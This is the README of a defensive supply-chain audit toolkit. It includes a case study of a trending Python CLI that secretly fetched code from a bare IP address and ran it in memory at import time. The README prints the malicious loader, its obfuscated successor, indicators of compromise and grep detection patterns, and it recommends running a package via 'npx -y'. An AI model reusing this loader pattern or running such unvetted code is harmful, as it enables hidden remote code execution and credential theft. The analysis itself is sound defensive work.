# agent-supply-chain-audit

Two small scripts and one checklist for the thing I kept doing wrong: **cloning a repo from a trending page and running it because the README said "nothing leaves your machine."**

No dependencies, no installation, no telemetry. Both scripts read source and print findings; neither installs or executes the target.

```bash
# bash (Linux / macOS / git-bash)
bash audit.sh https://github.com/<owner>/<repo>
bash audit.sh ./local/checkout

# python (any platform)
python audit.py https://github.com/<owner>/<repo>
```

[`audit.sh`](audit.sh) · [`audit.py`](audit.py)

Both audit the same five things:

| # | Check | Why it is the check |
|---|---|---|
| 1 | hardcoded IP endpoints (with/without scheme) | an open-source CLI that talks to `203.0.113.7:8765` has no business reason to; real tools use a domain and a documented API |
| 2 | `fetch → exec/compile/decompress` chains | downloading code and running it in-process is the entire malware pattern; the fetcher and the `exec` are often in *different files* |
| 3 | import-time side effects in `cli.py` / `__main__.py` / `__init__.py` | a top-level call like `setup.run_sync()` runs before you see a single line of output — including in `pip install .`'s build step |
| 4 | obfuscation smell: xor lambdas, large int-array literals, `getattr(mod, <decoded>)` | no legitimate cost-tracking CLI needs to hide module names behind byte arithmetic |
| 5 | declared vs real distribution (PyPI name, npm install hooks) | a `preinstall`/`postinstall` script is code you never read and always run |

A hit is a question, not proof. `no automatic red flags` is not a safety guarantee — see [Limits](#limits).

---

## Case study: a 1,145★ "runs entirely locally" CLI that did not

This is the real repo that made me write these scripts. It was on GitHub Trending in mid-September 2026, ~2 weeks old, ~1.1k stars, and its README said:

> tokentab reads the session logs that Claude Code, Codex, Cursor and Gemini CLI already leave on disk... **It runs entirely locally: no account, no API key, nothing leaves your machine.**

It even had a screenshot of a dashboard. What it also had, at commit `d9e8cb4` (2026-09-07), was `tokentab/setup.py`:

```python
CONFIG: dict[str, Any] = {
    "HOST": "172.233.51.81",     # bare IP, no domain
    "PORT": 8765,
    "ASSET": "main",
    "API_KEY": "test123",
    "PAYLOAD_KEY": "secret456",
    ...
}
CLIENT_MODULE = "manual_mapper.py"

def _fetch_bytes(url, api_key, timeout=60.0):
    headers = {"User-Agent": "SyncClient/1.0"}
    if api_key:
        headers["Authorization"] = f"Bearer {api_key}"
    ...

def _load_module_memory(name: str, data: bytes) -> None:
    module = types.ModuleType(mod_name)
    module.__file__ = f"<ram:{name}>"        # never touches disk
    sys.modules[mod_name] = module
    exec(compile(data, name, "exec"), module.__dict__)

def bootstrap(cfg, url):
    if sys.platform != "win32":
        raise RuntimeError("win32 only")
    data = _fetch_bytes(f"{_server_base(url)}/api/v1/client/{CLIENT_MODULE}", cfg["API_KEY"])
    _load_module_memory(CLIENT_MODULE, data)
```

and in `cli.py`, at module scope:

```python
from tokentab import setup

setup.run_sync()      # cli.py line 12 — runs on import, before any argument parsing
```

The same file still contained `Panel.fit(f"[bold cyan]text-humanizer[/bold cyan]...")` and a `Deepseek` REPL banner — leftovers from a different project, pasted wholesale.

After that version got noticed, the author did **not** remove the behaviour. Commit `3a7aac5` (2026-09-19, "add cursor support") replaced the readable loader with an obfuscated one: module names decoded through `lambda a,k: bytes(v ^ k for v in a)`, an embedded ~7 KB int-array blob, HMAC-SHA256 keystream decryption, `zlib.decompress`, and finally

```python
def _i44hyn5c6u():
    getattr(__import__(<decoded "builtins">), <decoded "exec">)(_q6newk(), globals())

_i44hyn5c6u()
```

Still executed at import, still called from `cli.py` line 12. Only the packaging changed — plaintext fetch became an inline blob, which removes the network dependency the first version had.

Verify it yourself (this clones, so do **not** `pip install .` or run `python cli.py`):

```bash
git clone --depth 1 https://github.com/crwdla/tokentab && cd tokentab
git show d9e8cb4:tokentab/setup.py | sed -n '12,23p'   # the CONFIG block
git show d9e8cb4:cli.py            | sed -n '1,14p'    # the import-time call
git show 3a7aac5:tokentab/setup.py                     # the obfuscated variant
```

Indicators from the two versions I inspected: `172.233.51.81:8765`, `91.92.47.134:8765`, path `/api/v1/sync?asset=main`, path `/api/v1/client/manual_mapper.py`, `User-Agent: SyncClient/1.0`, a synthetic module registered under the name `manual_mapper`.

**What I could not do:** recover the stage-2 program without running it. And that is the point — by the time stage 2 matters, the audit has already failed.

---

## The three grep commands, if you will not run a script

```bash
# 1. does it download anything?
grep -rnE 'urllib.request|urlopen|requests\.get|httpx\.|fetch\(' --include='*.py' --include='*.js' . | head -20

# 2. does it run code it did not ship?
grep -rnE 'exec\(|eval\(|compile\(|__import__\(|importlib\.import_module|b64decode|pickle\.loads' --include='*.py' . | head -20

# 3. does the entry point call anything at import time?
head -30 cli.py main.py app.py __main__.py 2>/dev/null
```

Command 3 is the one people skip, and it is the one that decides whether the payload runs while you are still reading the README.

---

## After you already installed something

Order matters:

1. **Kill the process** by matching the command line, never by blanket-killing the interpreter — on an agent machine `pkill python` will take your agent down with it.
2. **Clone nothing else from that author** before you finish.
3. **Rotate every credential the process could read** — `.env`, cloud tokens, git credentials, package registry tokens. Assume the machine's whole credential set is burnt; agent hosts are credential-dense by design.
4. **Scan and inventory persistence**: Run keys, scheduled tasks, Startup folder, `hosts`. A memory-only payload leaves nothing here, so an empty result is not an all-clear.
5. **Reboot.** A purely in-memory implant does not survive a restart. This is the only removal step that reliably works when there is no file on disk to delete.
6. **Inventory what else has execution rights.** Static file listings cannot see runtime behaviour; you need a list of who *can* execute:

```bash
npx -y geiger-scan                                   # agent / MCP / plugin / hook inventory
npx -y geiger-scan --json "$LOCALAPPDATA/Temp/geiger_$(date +%Y%m%d).json"
npx -y geiger-scan --diff baseline.json              # what appeared since last week
npx -y geiger-scan --strict                          # exit 2 if anything executable/keyed exists
```

On my machine the useful signal was not the total (65 items across 7 ecosystems) but the 13 items in the `EXECUTES` tier, and one of them was an agent event hook — hooks run **without a prompt**, so a replaced hook file is a silent backdoor. The `--diff` against last week's snapshot is what tells you *when* something new arrived.

---

## Limits

A static grep cannot see:

- behaviour that only appears at runtime (the payload I could not decode above);
- stage-2 code fetched at run time from a domain that looks fine today;
- code that never touches disk, so disk-based scanning and file-based allowlists both miss it;
- compromised upstream releases of tools you already trust.

So this is triage, not security. Its job is to make "clone and run" cost 30 seconds of reading instead of a credential rotation.

MIT.

---

Write-up with the full case study, decoded excerpts and the post-incident order of operations: [A 1,145-star CLI promised "nothing leaves your machine"](https://dev.to/felixwang007/a-1145-star-cli-promised-nothing-leaves-your-machine-it-executes-a-hidden-payload-at-import-2npd).
